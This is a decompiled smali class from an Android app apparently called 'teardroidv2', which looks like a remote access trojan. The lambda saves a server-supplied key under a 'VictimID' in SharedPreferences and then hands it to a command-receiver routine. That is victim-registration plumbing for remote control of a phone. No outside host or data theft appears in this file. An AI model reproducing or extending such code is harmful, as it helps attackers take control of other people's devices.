.class final Lcom/example/teardroidv2/CommandReciver$setVictim$1;
.super Lkotlin/jvm/internal/Lambda;
.source "CommandReciver.kt"

# interfaces
.implements Lkotlin/jvm/functions/Function1;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/teardroidv2/CommandReciver;->setVictim(Landroid/content/SharedPreferences;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x18
    name = null
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Lkotlin/jvm/internal/Lambda;",
        "Lkotlin/jvm/functions/Function1<",
        "Lorg/json/JSONObject;",
        "Lkotlin/Unit;",
        ">;"
    }
.end annotation

.annotation runtime Lkotlin/Metadata;
    d1 = {
        "\u0000\u000e\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\u0010\u0000\u001a\u00020\u00012\u0006\u0010\u0002\u001a\u00020\u0003H\n\u00a2\u0006\u0002\u0008\u0004"
    }
    d2 = {
        "<anonymous>",
        "",
        "it",
        "Lorg/json/JSONObject;",
        "invoke"
    }
    k = 0x3
    mv = {
        0x1,
        0x6,
        0x0
    }
    xi = 0x30
.end annotation


# instance fields
.field final synthetic $VictimDataStore:Landroid/content/SharedPreferences;

.field final synthetic this$0:Lcom/example/teardroidv2/CommandReciver;


# direct methods
.method constructor <init>(Landroid/content/SharedPreferences;Lcom/example/teardroidv2/CommandReciver;)V
    .locals 0

    iput-object p1, p0, Lcom/example/teardroidv2/CommandReciver$setVictim$1;->$VictimDataStore:Landroid/content/SharedPreferences;

    iput-object p2, p0, Lcom/example/teardroidv2/CommandReciver$setVictim$1;->this$0:Lcom/example/teardroidv2/CommandReciver;

    const/4 p1, 0x1

    invoke-direct {p0, p1}, Lkotlin/jvm/internal/Lambda;-><init>(I)V

    return-void
.end method


# virtual methods
.method public bridge synthetic invoke(Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    .line 155
    check-cast p1, Lorg/json/JSONObject;

    invoke-virtual {p0, p1}, Lcom/example/teardroidv2/CommandReciver$setVictim$1;->invoke(Lorg/json/JSONObject;)V

    sget-object p1, Lkotlin/Unit;->INSTANCE:Lkotlin/Unit;

    return-object p1
.end method

.method public final invoke(Lorg/json/JSONObject;)V
    .locals 4

    const-string v0, "it"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 149
    iget-object v0, p0, Lcom/example/teardroidv2/CommandReciver$setVictim$1;->$VictimDataStore:Landroid/content/SharedPreferences;

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 150
    sget-object v1, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v1}, Lcom/example/teardroidv2/AppInfo;->getVictimID()Ljava/lang/String;

    move-result-object v1

    const-string v2, "key"

    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v1, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 151
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 152
    iget-object v0, p0, Lcom/example/teardroidv2/CommandReciver$setVictim$1;->this$0:Lcom/example/teardroidv2/CommandReciver;

    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v1, "it.getString(\"key\")"

    invoke-static {p1, v1}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v0, p1}, Lcom/example/teardroidv2/CommandReciver;->access$commandReciver(Lcom/example/teardroidv2/CommandReciver;Ljava/lang/String;)V

    return-void
.end method
